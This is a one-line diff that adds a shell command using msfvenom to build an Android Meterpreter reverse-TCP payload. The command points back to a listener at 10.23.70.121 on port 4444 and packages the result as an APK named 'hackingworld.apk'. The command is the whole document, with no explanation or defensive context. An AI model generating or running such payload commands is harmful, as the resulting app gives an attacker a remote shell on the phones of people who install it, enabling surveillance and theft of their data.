@@ -1,0 +1,1 @@
+msfvenom -p android/meterpreter/reverse_tcp LHOST=10.23.70.121 LPORT=4444 R > hackingworld.apk
